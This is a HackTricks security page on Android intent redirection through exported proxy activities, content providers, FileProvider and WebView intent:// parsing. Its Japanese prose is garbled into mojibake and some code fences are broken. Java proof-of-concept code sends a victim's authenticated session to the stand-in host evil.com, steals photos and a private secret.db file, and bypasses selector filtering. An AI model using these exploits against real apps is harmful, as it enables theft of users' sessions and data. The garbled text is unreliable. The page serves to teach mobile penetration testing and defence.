<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«åºƒå‘Šã‚’æ²è¼‰ã—ãŸã„å ´åˆ**ã‚„**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„å ´åˆ**ã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã€‚

</details>


**èª¿æŸ»ã¯ã“ã¡ã‚‰ã‹ã‚‰** [**https://blog.oversecured.com/Android-Access-to-app-protected-components/**](https://blog.oversecured.com/Android-Access-to-app-protected-components/)

# ã¯ã˜ã‚ã«

ã“ã®è„†å¼±æ€§ã¯**ã‚¦ã‚§ãƒ–ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®Open Redirect**ã«ä¼¼ã¦ã„ã¾ã™ã€‚`Intent`ã‚¯ãƒ©ã‚¹ã¯`Parcelable`ã§ã‚ã‚‹ãŸã‚ã€**ã“ã®ã‚¯ãƒ©ã‚¹ã«å±ã™ã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã¯ã€åˆ¥ã®`Intent`ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®**è¿½åŠ ãƒ‡ãƒ¼ã‚¿**ã¨ã—ã¦**æ¸¡ã™ã“ã¨ãŒã§ãã¾ã™**ã€‚\
å¤šãã®é–‹ç™ºè€…ã¯ã“ã®**æ©Ÿèƒ½**ã‚’åˆ©ç”¨ã—ã¦ã€**ãƒ—ãƒ­ã‚­ã‚·ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆ**ï¼ˆã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã€ãƒ–ãƒ­ãƒ¼ãƒ‰ã‚­ãƒ£ã‚¹ãƒˆãƒ¬ã‚·ãƒ¼ãƒãƒ¼ã€ã‚µãƒ¼ãƒ“ã‚¹ï¼‰ã‚’ä½œæˆã—ã€`startActivity(...)`ã€`sendBroadcast(...)`ãªã©ã®å±é™ºãªãƒ¡ã‚½ãƒƒãƒ‰ã«**åŸ‹ã‚è¾¼ã¾ã‚ŒãŸIntentã‚’æ¸¡ã—ã¾ã™**ã€‚\
ã“ã‚Œã¯å±é™ºã§ã™ã€‚ãªãœãªã‚‰ã€**æ”»æ’ƒè€…ãŒã‚¢ãƒ—ãƒªã«å¯¾ã—ã¦ç›´æ¥èµ·å‹•ã§ããªã„éã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’èµ·å‹•ã•ã›ãŸã‚Šã€æ”»æ’ƒè€…ã«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‰ã§ã™**ã€‚**`WebView`**ã‚‚æ™‚ã€…ã€`Intent.parseUri(...)`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦**URLã‚’æ–‡å­—åˆ—ã‹ã‚‰`Intent`ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«å¤‰æ›´ã—**ã€`startActivity(...)`ã«æ¸¡ã—ã¾ã™ã€‚

{% hint style="info" %}
è¦ç´„ã™ã‚‹ã¨ï¼šæ”»æ’ƒè€…ãŒä¸å®‰å…¨ã«å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹Intentã‚’é€ä¿¡ã§ãã‚‹å ´åˆã€ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ãªã„ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€ãã‚Œã‚‰ã‚’æ‚ªç”¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

# å…¸å‹çš„ãªã‚±ãƒ¼ã‚¹

ä¾‹ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚`AndroidManifest.xml`ãƒ•ã‚¡ã‚¤ãƒ«ã®æ–­ç‰‡
```markup
<activity android:name=".ProxyActivity" android:exported="true" />
<activity android:name=".AuthWebViewActivity" android:exported="false" />
```
Activity `ProxyActivity`
```java
startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
```
Activity `AuthWebViewActivity`
```java
webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
```
`AuthWebViewActivity`ã¯ã€ã“ã®å ´åˆ`url`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã‹ã‚‰å–å¾—ã—ãŸURLã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®èªè¨¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’æ¸¡ã™ã¨ã„ã†ã€**ç‰¹å®šã®å®‰å…¨ã§ãªã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹éš ã•ã‚ŒãŸã‚¢ãƒ—ãƒªæ©Ÿèƒ½ã®ä¾‹**ã§ã™ã€‚

è¼¸å‡ºåˆ¶é™ã«ã‚ˆã‚Šã€**æ”»æ’ƒè€…ã¯`AuthWebViewActivity`ã«ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã›ã‚“**ã€‚ç›´æ¥å‘¼ã³å‡ºã—
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
startActivity(intent);
```
```markdown
`java.lang.SecurityException`ãŒã‚¹ãƒ­ãƒ¼ã•ã‚Œã€`Permission Denial`: `AuthWebViewActivity`ãŒuid 1337ã‹ã‚‰ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ãªã„ãŸã‚ã§ã™ã€‚

ã—ã‹ã—ã€æ”»æ’ƒè€…ã¯**è¢«å®³è€…ã«`AuthWebViewActivity`ã‚’è‡ªã‚‰èµ·å‹•ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™**ï¼š
```
```java
Intent extra = new Intent();
extra.setClassName("com.victim", "com.victim.AuthWebViewActivity");
extra.putExtra("url", "http://evil.com/");

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
# å½±éŸ¿ã®ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³

ã“ã®è„†å¼±æ€§ã®å½±éŸ¿ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ãƒˆã•ã›ã‚‹ãŸã‚ã«ã¯ã€**ä»–ã®è„†å¼±æ€§ã‚„èª¤è¨­å®šã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€è„†å¼±æ€§ã®å½±éŸ¿ã‚’å¢—å¤§ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™**ï¼ˆè„†å¼±æ€§è‡ªä½“ã¯ãƒªã‚¹ã‚¯ã‚’ç”Ÿã˜ã•ã›ã¾ã›ã‚“ï¼‰ã€‚

## Content Providersã‚’ä»‹ã—ãŸæ”»æ’ƒã®ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³

å…ƒã®ã‚¢ãƒ—ãƒªã®ä»»æ„ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã«åŠ ãˆã¦ã€**æ”»æ’ƒè€…ã¯è„†å¼±ãªã‚¢ãƒ—ãƒªã®Content Providersã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚ä»¥ä¸‹ã®æ¡ä»¶ã‚’æº€ãŸã™å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š

* **éã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆ**ã•ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆãã†ã§ãªã‘ã‚Œã°ã€**ç›´æ¥æ”»æ’ƒã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ã€ã“ã®è¨˜äº‹ã§è­°è«–ã—ã¦ã„ã‚‹è„†å¼±æ€§ã‚’ä½¿ç”¨ã›ãšã«ï¼‰
* **`android:grantUriPermissions`** ãƒ•ãƒ©ã‚°ãŒ **`true`** ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
* `android:grantUriPermissions="true"` ã¯ã€Javaã‚³ãƒ¼ãƒ‰ãŒãã® `ContentProvider` ã«ã‚ˆã£ã¦æä¾›ã•ã‚Œã‚‹ **ä»»æ„ã® `Uri`** ã§ `FLAG_GRANT_READ_URI_PERMISSION` ã¨ `FLAG_GRANT_WRITE_URI_PERMISSION` ã‚’ä½¿ç”¨ã§ãã‚‹ã“ã¨ã‚’ç¤ºã—ã¾ã™ã€‚
* `android:grantUriPermissions="false"` ã¯ã€**`<grant-uri-permission>` å­è¦ç´ ã«ã‚ˆã£ã¦æŒ‡å®šã•ã‚ŒãŸ `Uri` å€¤ã®ã¿** ãŒ `FLAG_GRANT_READ_URI_PERMISSION` ã¨ `FLAG_GRANT_WRITE_URI_PERMISSION` ã§ä½¿ç”¨ã§ãã‚‹ã“ã¨ã‚’ç¤ºã—ã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€åŸ‹ã‚è¾¼ã¾ã‚ŒãŸã‚¤ãƒ³ãƒ†ãƒ³ãƒˆã®å—ä¿¡è€…ã¨ã—ã¦è‡ªèº«ã‚’è¨­å®šã—ã€ä»¥ä¸‹ã®ãƒ•ãƒ©ã‚°ã‚’è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™

* `Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION` ã¯ãƒ—ãƒ­ãƒã‚¤ãƒ€ã¸ã®æ°¸ç¶šçš„ãªã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ã¾ã™ï¼ˆã“ã®ãƒ•ãƒ©ã‚°ãŒãªã„å ´åˆã€ã‚¢ã‚¯ã‚»ã‚¹ã¯ä¸€å›é™ã‚Šã§ã™ï¼‰
* `Intent.FLAG_GRANT_PREFIX_URI_PERMISSION` ã¯URIã¸ã®ãƒ—ãƒ¬ãƒ•ã‚£ãƒƒã‚¯ã‚¹ã«ã‚ˆã‚‹ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ã¾ã™ - ä¾‹ãˆã°ã€`content://com.victim.provider/image/1` ã®ã‚ˆã†ãªå®Œå…¨ãªãƒ‘ã‚¹ã‚’ä½¿ç”¨ã—ã¦ç¹°ã‚Šè¿”ã—ã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ã™ã‚‹ä»£ã‚ã‚Šã«ã€æ”»æ’ƒè€…ã¯URI `content://com.victim.provider/` ã‚’ä½¿ç”¨ã—ã¦ãƒ—ãƒ­ãƒã‚¤ãƒ€ã®å…¨ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ã€ãã®å¾Œ `ContentResolver` ã‚’ä½¿ç”¨ã—ã¦ `content://com.victim.provider/image/1`ã€`content://com.victim.provider/image/2` ãªã©ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚
* `Intent.FLAG_GRANT_READ_URI_PERMISSION` ã¯ãƒ—ãƒ­ãƒã‚¤ãƒ€ã¸ã®èª­ã¿å–ã‚Šæ“ä½œï¼ˆ`query`ã€`openFile`ã€`openAssetFile` ãªã©ï¼‰ã‚’è¨±å¯ã—ã¾ã™
* `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` ã¯æ›¸ãè¾¼ã¿æ“ä½œã‚’è¨±å¯ã—ã¾ã™

æ”»æ’ƒè€…ãŒã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ã—ã€`query`ã€`update`ã€`insert`ã€`delete`ã€`openFile`ã€`openAssetFile` ãªã©ã®é€šå¸¸ã®æ“ä½œã‚’è¡Œã†ã“ã¨ãŒã§ãã‚‹å…¸å‹çš„ãªãƒ—ãƒ­ãƒã‚¤ãƒ€ã®ä¾‹
```markup
<provider android:name="com.victim.ContentProvider" android:exported="false" android:authorities="com.victim.provider" android:grantUriPermissions="true"/>
```
ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å†™çœŸã®ç›—é›£ã®ä¾‹ `AndroidManifest.xml` ãƒ•ã‚¡ã‚¤ãƒ«
```markup
<activity android:name=".LeakActivity" android:exported="true" />
```
`MainActivity.java` ãƒ•ã‚¡ã‚¤ãƒ«
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
| Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
| Intent.FLAG_GRANT_READ_URI_PERMISSION
| Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.provider/"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
Uri uri = Uri.parse(getIntent().getDataString() + "image/1")); // content://com.victim.provider/image/1
Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri)); // stolen image
```
## Android File Providerã¸ã®æ”»æ’ƒ

ã“ã®è„†å¼±æ€§ã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯é–‹ç™ºè€…ãŒäº‹å‰ã«å®šã‚ãŸãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ä½ç½®ã™ã‚‹**ã‚¢ãƒ—ãƒªãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç›—ã‚€**ã“ã¨ã‚‚å¯èƒ½ã«ãªã‚Šã¾ã™ã€‚æ”»æ’ƒã‚’æˆåŠŸã•ã›ã‚‹ãŸã‚ã«ã¯ã€æ‚ªæ„ã®ã‚ã‚‹ã‚¢ãƒ—ãƒªãŒ**Android File Providerã¸ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’å–å¾—ã—ã€Android ContentResolverã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‹ã‚‰å†…å®¹ã‚’èª­ã¿å–ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ãƒ•ã‚¡ã‚¤ãƒ«ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã®ä¾‹ï¼ˆè©³ç´°ã¯[https://developer.android.com/reference/android/support/v4/content/FileProvider](https://developer.android.com/reference/android/support/v4/content/FileProvider)ã‚’å‚ç…§ï¼‰
```markup
<provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="com.victim.files_provider" android:grantUriPermissions="true">
<meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
</provider>
```
ãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®èª­ã¿æ›¸ãã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã—ã¾ã™ã€‚ã“ã‚Œã¯ã‚¢ãƒ—ãƒªãƒªã‚½ãƒ¼ã‚¹å†…ã®ç‰¹åˆ¥ãªãƒªã‚¹ãƒˆã«ã‚ã‚Šã€ã“ã®å ´åˆã¯ `res/xml/provider_paths.xml` ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãã‚Œã¯ãŠãã‚‰ãæ¬¡ã®ã‚ˆã†ã«è¦‹ãˆã‚‹ã§ã—ã‚‡ã†
```markup
<?xml version="1.0" encoding="utf-8"?>
<paths>
<root-path name="root" path=""/>
<files-path name="internal_files" path="."/>
<cache-path name="cache" path=""/>
<external-path name="external_files" path="images"/>
</paths>
```
```markdown
å„ã‚¿ã‚°ã¯ã€ãƒ«ãƒ¼ãƒˆã«å¯¾ã—ã¦ç›¸å¯¾çš„ãª`path`å€¤ã‚’æŒã¤ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’æŒ‡å®šã—ã¾ã™ã€‚ä¾‹ãˆã°ã€`external_files`ã®å€¤ã¯`new File(Environment.getExternalStorageDirectory(), "images")`ã«å¯¾å¿œã—ã¾ã™ã€‚

`root-path`ã®å€¤ã¯`/`ã«å¯¾å¿œã—ã€ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã—ã¾ã™ã€‚

ä¾‹ãˆã°ã€ç§˜å¯†ã®ãƒ‡ãƒ¼ã‚¿ãŒ`/data/data/com.victim/databases/secret.db`ãƒ•ã‚¡ã‚¤ãƒ«ã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ã¨ã—ã¾ã—ã‚‡ã†ï¼šã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã®ç›—é›£ã¯`MainActivity.java`ã§ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“
```
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
InputStream i = getContentResolver().openInputStream(getIntent().getData()); // we can now do whatever we like with this stream, e.g. send it to a remote server
```
## WebViewã‚’ä»‹ã—ãŸä»»æ„ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

Intentã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã€`Intent.toUri(flags)`ã®å‘¼ã³å‡ºã—ã§æ–‡å­—åˆ—ã«ã‚­ãƒ£ã‚¹ãƒˆã§ãã€`Intent.parseUri(stringUri, flags)`ã‚’ä½¿ç”¨ã—ã¦æ–‡å­—åˆ—ã‹ã‚‰Intentã«æˆ»ã™ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æ©Ÿèƒ½ã¯ã€WebViewï¼ˆã‚¢ãƒ—ãƒªã®çµ„ã¿è¾¼ã¿ãƒ–ãƒ©ã‚¦ã‚¶ãƒ¼ï¼‰ã§ã‚ˆãä½¿ç”¨ã•ã‚Œã¾ã™ï¼š**ã‚¢ãƒ—ãƒªã¯`intent://`ã‚¹ã‚­ãƒ¼ãƒ ã‚’æ¤œè¨¼ã—ã€URLã‚’Intentã«è§£æã—ã¦ã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã‚’èµ·å‹•ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚

**ã“ã®è„†å¼±æ€§ã¯ã€ä»–ã®è„†å¼±æ€§ã‚’ä»‹ã—ã¦ã‚‚æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ï¼ˆä¾‹ãˆã°ã€ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã•ã‚ŒãŸã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã‚’ä»‹ã—ã¦WebViewã§ã‚¢ãƒ—ãƒªå†…ã§ä»»æ„ã®ãƒªãƒ³ã‚¯ã‚’ç›´æ¥é–‹ãèƒ½åŠ›ã€ã¾ãŸã¯ãƒ‡ã‚£ãƒ¼ãƒ—ãƒªãƒ³ã‚¯ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’é€šã˜ã¦ï¼‰ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚¢ãƒ—ãƒªã§ã€ã¾ãŸã¯ãƒªãƒ¢ãƒ¼ãƒˆã§ã€ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã®ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚°ã‚„ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®MitMã‚’å«ã‚€

è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã®ä¾‹
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
```markdown
ã“ã“ã§ã®ãƒã‚¤ãƒ³ãƒˆã¯ã€`WebViewClient` ã‚¯ãƒ©ã‚¹ã® `shouldOverrideUrlLoading(...)` ãƒ¡ã‚½ãƒƒãƒ‰ãŒ WebView ãŒæ–°ã—ã„ãƒªãƒ³ã‚¯ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã‚ˆã†ã¨ã™ã‚‹ãŸã³ã«å‘¼ã³å‡ºã•ã‚Œã‚‹ãŒã€ã‚¢ãƒ—ãƒªã«ã‚«ã‚¹ã‚¿ãƒ ãƒãƒ³ãƒ‰ãƒ©ã‚’è¿½åŠ ã™ã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä¸ãˆã‚‹ã“ã¨ã§ã™ã€‚

ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã€æ”»æ’ƒè€…ã¯ç‰¹åˆ¥ã«æº–å‚™ã•ã‚ŒãŸ intent-scheme URL ã¸ã® WebView ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã‚’ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚URL ä½œæˆã®ä¾‹
```
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // outputs "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end"
```
ä¾‹ã®æ”»æ’ƒ
```java
location.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end";
```
ã“ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã¯ã€**ã‚¯ãƒ©ã‚·ãƒƒã‚¯ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®è„†å¼±æ€§ã¨æ¯”è¼ƒã—ã¦ã„ãã¤ã‹ã®åˆ¶é™ãŒã‚ã‚Šã¾ã™**ï¼š

* åŸ‹ã‚è¾¼ã¾ã‚ŒãŸ `Parcelable` ã¨ `Serializable` ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯æ–‡å­—åˆ—ã«ã‚­ãƒ£ã‚¹ãƒˆã§ãã¾ã›ã‚“ï¼ˆç„¡è¦–ã•ã‚Œã¾ã™ï¼‰
* `Intent.parseUri(...)` ãŒå‘¼ã³å‡ºã•ã‚ŒãŸã¨ãã€ä¸å®‰å…¨ãªãƒ•ãƒ©ã‚° `Intent.FLAG_GRANT_READ_URI_PERMISSION` ã¨ `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` ã¯**ç„¡è¦–ã•ã‚Œã¾ã™**ã€‚ãƒ‘ãƒ¼ã‚µãƒ¼ã¯ `Intent.URI_ALLOW_UNSAFE` ãƒ•ãƒ©ã‚°ãŒè¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã®ã¿ãã‚Œã‚‰ã‚’æ®‹ã—ã¾ã™ï¼ˆ`startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))` ã¨ã¦ã‚‚ç¨€ã§ã™

å¤šãã®é–‹ç™ºè€…ã¯ã€WebViewçµŒç”±ã§å—ã‘å–ã£ãŸã‚¤ãƒ³ãƒ†ãƒ³ãƒˆã®å®Œå…¨ãªãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã‚’è¡Œã†ã“ã¨ã‚’å¿˜ã‚ŒãŒã¡ã§ã™ã€‚
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
Intent intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
startActivity(intent);
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
æ”»æ’ƒè€…ã¯ã‚»ãƒ¬ã‚¯ã‚¿ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ãªã„ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’æŒ‡å®šã§ãã¾ã™
```java
Intent intent = new Intent();
intent.setSelector(new Intent().setClassName("com.victim", "com.victim.AuthWebViewActivity"));
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // "intent:#Intent;S.url=http%3A%2F%2Fevil.com%2F;SEL;component=com.victim/.AuthWebViewActivity;end"
```
ã‚¢ãƒ—ãƒªã®æ˜ç¤ºçš„ãªã‚¤ãƒ³ãƒ†ãƒ³ãƒˆã«å¯¾ã™ã‚‹ä¿è­·ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã‚»ãƒ¬ã‚¯ã‚¿ã®ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã‚‚æ¨å¥¨ã—ã¾ã™ã€‚
```java
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
intent.setSelector(null);
```
ã—ã‹ã—ã€å®Œå…¨ãªãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã‚’è¡Œã£ã¦ã‚‚ã€æ”»æ’ƒè€…ãŒéã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã•ã‚ŒãŸã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã®`intent-filter`ã«å¯¾å¿œã™ã‚‹æš—é»™çš„ãªã‚¤ãƒ³ãƒ†ãƒ³ãƒˆã‚’ä½œæˆã™ã‚‹ã“ã¨ã§ã€å®Œå…¨ãªä¿è­·ãŒä¿è¨¼ã•ã‚Œã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£å®£è¨€ã®ä¾‹ï¼š
```markup
<activity android:name=".AuthWebViewActivity" android:exported="false">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<data android:scheme="victim" android:host="secure_handler" />
</intent-filter>
</activity>
```

```java
